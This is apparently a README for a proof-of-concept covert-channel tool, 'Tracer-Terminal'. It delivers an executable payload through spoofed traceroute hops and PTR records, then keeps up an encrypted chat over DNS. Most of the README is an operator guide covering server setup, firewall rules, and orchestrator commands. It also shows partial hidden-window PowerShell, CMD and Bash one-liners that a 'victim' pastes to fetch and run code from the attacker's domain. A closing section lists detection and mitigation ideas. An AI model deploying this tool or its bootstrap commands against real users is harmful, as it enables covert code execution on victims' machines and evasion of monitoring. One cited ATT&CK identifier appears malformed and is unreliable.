# Tracer-Terminal / Tracer-Talk

A proof-of-concept demonstrating DNS covert channels via `tracert`/`traceroute`. The server (Orchestrator) delivers an encrypted chat client through ICMP fake hops and maintains full-duplex encrypted chat -- all disguised as routine network diagnostic traffic. The vulnerability design is called **Tracer-Terminal**; the chat protocol it enables is **Tracer-Talk**.

**For security research purposes only. See [LICENSE](LICENSE) for terms and disclaimer.**

## How It Works

The Orchestrator listens on port 53 (DNS) and ICMP. When a "victim" or remote actor runs a `tracert` command (via a ClickFix-style one-liner), the server:

1. Responds to the DNS A-record query for the target subdomain (the resolved IP doubles as the XOR encryption key)
2. Creates fake ICMP hops by responding with "Time Exceeded" messages from spoofed IPs
3. Serves PTR records for each spoofed IP containing encrypted hex-encoded payload shards
4. The victim's `tracert` output displays these shard hostnames, which the one-liner extracts, decodes, and executes

The delivered payload is a compact chat client that continues to communicate bidirectionally over tracert commands.

## Architecture

```
                  Orchestrator (Python)
                  +---------------------------+
                  |  DNS Handler (port 53)    |  <-- Subdomain command routing
                  |  ICMP Tunnel (Scapy)      |  <-- Fake hop factory
                  |  Session Manager          |  <-- Per-client state
                  |  Shard Encoder            |  <-- Payload chunking + crypto
                  |  Chat CLI                 |  <-- Server operator interface
                  +---------------------------+
                           |
              tracert / traceroute queries
                           |
                  +---------------------------+
                  |  Client (zero deps)       |
                  |  Bootstrap one-liner      |  <-- Downloads + executes payload
                  |  Chat client (.bat/.ps1/.sh)  <-- Bidirectional chat
                  +---------------------------+
```

## Subdomain Command Map

All client communication uses `tracert [command].lab.yourdomain.com`:

| Pattern | Direction | Purpose |
|---------|-----------|---------|
| `payload.lab.d.com` | Downlink | Deliver chat client as encrypted PTR shards across fake hops |
| `key.lab.d.com` | Downlink | A-record IP = 4-byte XOR session key |
| `[hex].tx.lab.d.com` | Uplink | Client sends XOR-encrypted hex-encoded message in subdomain |
| `rx.lab.d.com` | Downlink | Client polls for messages via fake-hop PTR shards |
| `ack.lab.d.com` | Uplink | Client acknowledges receipt of last downlink |
| `end.lab.d.com` | Uplink | Session teardown |

## Shard Capacity

Each fake hop carries a PTR hostname up to 253 characters (RFC 1035). The shard encoder auto-calculates capacity based on the configured domain:

- FQDN limit: 253 chars
- Domain suffix `.lab.yourdomain.com`: 17 chars
- Available per hop: ~233 hex chars across 4 labels (~116 bytes)
- Default 30-hop tracert with ~15 usable hops: **~1,740 bytes**
- Best case (short route, 28 hops): **~3,248 bytes**

## Prerequisites

**Server** (Linux recommended):
- Python 3.10+
- Root/admin access (raw sockets + port 53)

**Client** (zero external dependencies):
- Windows: `tracert.exe` + `powershell.exe` (built-in)
- Linux/macOS: `traceroute` + `bash` + `grep` (standard)

## Quick Start

### Step 1: DNS Configuration (One-Time Setup)

Go to your domain registrar's DNS management panel and add two records. This delegates a subdomain zone to your own server so it becomes the authoritative DNS for all `*.lab.yourdomain.com` queries.

**Record 1 -- Glue A Record** (tells the internet where your nameserver lives):

| Name | Type | TTL | Value |
|------|------|-----|-------|
| `ns1` | A | 30 min | `YOUR_SERVER_PUBLIC_IP` |

**Record 2 -- NS Delegation** (delegates the `lab` subdomain to your nameserver):

| Name | Type | TTL | Value |
|------|------|-----|-------|
| `lab` | NS | 30 min | `ns1.yourdomain.com` |

**Example** using `example.com` with server at `203.0.113.50`:

| Name | Type | TTL | Value |
|------|------|-----|-------|
| `ns1` | A | 30 min | `203.0.113.50` |
| `lab` | NS | 30 min | `ns1.example.com` |

After this, any DNS query for `*.lab.example.com` anywhere in the world will be routed to your server on port 53.

**Registrar-specific notes:**
- **Cloudflare**: The `ns1` A record must be "DNS Only" (grey cloud icon). Cloudflare's proxy does not forward port 53.
- **GoDaddy / Namecheap / Porkbun**: Standard DNS panel, add the records directly.
- **Home IP (Comcast, etc.)**: Works if you have a static IP. Port 53 may be blocked by some residential ISPs -- verify with `nslookup test.lab.yourdomain.com` from an external machine.

Allow up to 30 minutes for DNS propagation.

### Step 2: Configure the Server

Edit `server/config.py` and set your domain and public IP:

```python
DOMAIN_ZONE = "lab.yourdomain.com"   # must match your NS delegation
SERVER_IP = "YOUR_SERVER_PUBLIC_IP"   # the IP from your glue A record
```

The `SERVER_IP` also becomes the 4-byte XOR encryption key (its octets), and is what `tracert` displays in its header line.

### Step 3: Install Dependencies

```bash
pip install -r requirements.txt
```

Requires only `dnslib` and `scapy`. Python 3.10+ recommended.

### Step 4: Open Firewall and Suppress Kernel ICMP

The server needs port 53 (DNS) and ICMP open inbound. On Linux, the kernel must NOT reply to ICMP Echo Requests -- Scapy handles that instead to create the fake hops.

```bash
# Allow DNS and ICMP inbound
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 53 -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT

# CRITICAL: suppress kernel ICMP echo-reply so only Scapy responds
sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP
```

If behind a home router, also port-forward UDP 53, TCP 53, and ICMP to your server's local IP.

### Step 5: Generate Client Scripts

The client scripts and bootstrap one-liners in `clients/` and `bootstrap/` are **templates** with `{{DOMAIN_ZONE}}`, `{{SERVER_IP}}`, etc. placeholders. Run the generator to stamp out working copies:

```bash
python generate.py
# Or override config on the command line:
python generate.py --domain lab.example.com --ip 203.0.113.50
```

This creates a `build/` folder with ready-to-use client scripts and bootstraps.

### Step 6: Start the Orchestrator

Run from the project root directory (`tracerterminal/`). Point `--payload` at the **generated** client, not the template:

```bash
# Deliver the PowerShell chat client to Windows targets
sudo python -m server.orchestrator --payload build/clients/chat_client.ps1

# Or the Bash client for Linux/macOS targets
sudo python -m server.orchestrator --payload build/clients/chat_client.sh

# Or the CMD batch client
sudo python -m server.orchestrator --payload build/clients/chat_client.bat
```

You can also override config values from the command line:

```bash
sudo python -m server.orchestrator \
  --payload build/clients/chat_client.ps1 \
  --domain lab.example.com \
  --ip 203.0.113.50
```

Root/admin is required for Scapy raw sockets and binding to port 53.

### Step 7: Verify DNS Delegation

From any external machine (not the server), run:

```
nslookup test.lab.yourdomain.com
```

You should see the query arrive in the orchestrator's console output. If it does, the full NS delegation chain is working and the server is ready for clients.

### Step 8: Send the Bootstrap to a Client

Give the target the appropriate one-liner from `bootstrap/`. See [clients/README.md](clients/README.md) for details on how each bootstrap and chat client works.

## Usage

### Server Side

```
[*] Tracer Terminal Orchestrator
[*] Domain zone: lab.example.com
[*] Server IP / XOR key: 203.0.113.50 -> [203, 0, 113, 50]
[*] Payload loaded: build/clients/chat_client.ps1 (1009 bytes)
[*] Payload encoded into 6 data shards + end marker
[*] Server ready. Waiting for connections...
[*] Commands: /list  /select <ip>  /quit

[+] New client: 198.51.100.25
[>] Delivering payload to 198.51.100.25 (6 shards)

server> /list
  198.51.100.25  [CHATTING]  inbox:0  outbox:0

server> /select 198.51.100.25
[*] Selected: 198.51.100.25

server> Hello from the server!
[*] Queued for 198.51.100.25 (will deliver on next rx poll)

[198.51.100.25] Hi back!
```

### Client Side (Bootstrap)

The victim pastes one of the **generated** one-liners from `build/bootstrap/`. Each uses only built-in OS tools:

**PowerShell** (copy-paste into PowerShell or Win+R):
```
powershell -w h -nop -c "$z='lab.example.com';$t=tracert payload.$z;..."
```
(See `build/bootstrap/bootstrap_ps.txt` for the full command)

**CMD** (copy-paste into cmd.exe):
```
@tracert payload.lab.example.com>%tmp%\tt.txt&powershell -nop -w h -c "..."
```
(See `build/bootstrap/bootstrap_cmd.txt` for the full command)

**Bash** (copy-paste into terminal):
```bash
z=lab.example.com;t=$(traceroute payload.$z 2>&1);k=(203 0 113 50);...
```
(See `build/bootstrap/bootstrap_bash.txt` for the full command)

### Chat Client (After Delivery)

Once the bootstrap delivers and executes the chat client:

```
=== Tracer Terminal Chat ===
Type message, Enter to send. /quit to exit.
you: Hello from the client!
server: Hello from the server!
you: /quit
Disconnected.
```

## Protocol Flow

```
                   Client                          Server
                     |                               |
  Bootstrap:         |  tracert payload.lab.d.com    |
  1. DNS A query --> |  --------------------------> |  [Orchestrator routes to PayloadBuilder]
  2. ICMP probes --> |  --------------------------> |  [ICMP Tunnel: fake hops with PTR shards]
  3. PTR lookups <-- |  <-------------------------- |  [DNS: shard hostnames per hop]
  4. Decode+exec     |                               |
                     |                               |
  Chat loop:         |                               |
  5. Send msg:       |  tracert [hex].tx.lab.d.com  |
     DNS query ----> |  --------------------------> |  [UplinkParser: extract message]
                     |                               |
  6. Poll:           |  tracert rx.lab.d.com        |
     ICMP probes --> |  --------------------------> |  [MsgBuilder: fake hops with response]
     PTR lookups <-- |  <-------------------------- |  [DNS: message shards]
  7. Decode+display  |                               |
                     |                               |
  8. Ack:            |  tracert ack.lab.d.com       |
     DNS query ----> |  --------------------------> |  [Clear send buffer]
```

## Encryption

- **Algorithm**: XOR with 4-byte repeating key
- **Key source**: Server IP address octets (e.g., `203.0.113.50` = `[0xCB, 0x00, 0x71, 0x32]`)
- **Encoding**: Hex (0-9, a-f) for DNS-safe transport
- **Compression**: zlib applied before encryption for payload delivery

## File Structure

```
tracerterminal/
  server/
    orchestrator.py       # Director: wires components, manages sessions, chat CLI
    dns_handler.py        # dnslib DNS server with subdomain command routing
    icmp_tunnel.py        # Scapy ICMP fake-hop factory
    shard_encoder.py      # Payload chunking, XOR crypto, hex encoding
    config.py             # Domain, IP, capacity constants -- EDIT THIS FIRST
  clients/                # TEMPLATES with {{placeholders}}
    chat_client.bat       # CMD chat client template
    chat_client.ps1       # PowerShell chat client template
    chat_client.sh        # Bash chat client template
    README.md             # How the clients and protocol work
  bootstrap/              # TEMPLATES with {{placeholders}}
    bootstrap_cmd.txt     # CMD one-liner template
    bootstrap_ps.txt      # PowerShell one-liner template
    bootstrap_bash.txt    # Bash one-liner template
  generate.py             # Stamps out working clients/bootstraps from templates + config
  build/                  # Generated output (gitignored) -- use these files
  requirements.txt
  README.md
```

## Security Research Context

This PoC demonstrates that:

1. **tracert/traceroute output can be weaponized** as a payload delivery mechanism by spoofing ICMP hops and controlling PTR records
2. **DNS subdomain queries** provide a covert uplink channel that looks like routine diagnostic traffic
3. **Standard network monitoring** focused on TCP/HTTP is blind to this ICMP+DNS channel
4. **No special client software** is needed -- the attack uses only built-in OS diagnostic tools

Related work:
- ClickFix attacks (2026) extracting payloads from DNS Name fields
- MITRE ATT&CK FGT1048.501 (Covert DNS Exfiltration)
- CWE-350 (Reliance on Reverse DNS for security decisions)
- DNS tunneling campaigns (TrkCdn, Iodine, DNSCat2)

## Mitigations

- Enforce `tracert -d` / `traceroute -n` (disables PTR resolution)
- Monitor for high-entropy PTR hostnames in DNS traffic
- DNS firewalls that strip shell-sensitive characters from PTR responses
- Block ICMP Time Exceeded from unexpected sources
- Rate-limit DNS PTR queries from single hosts
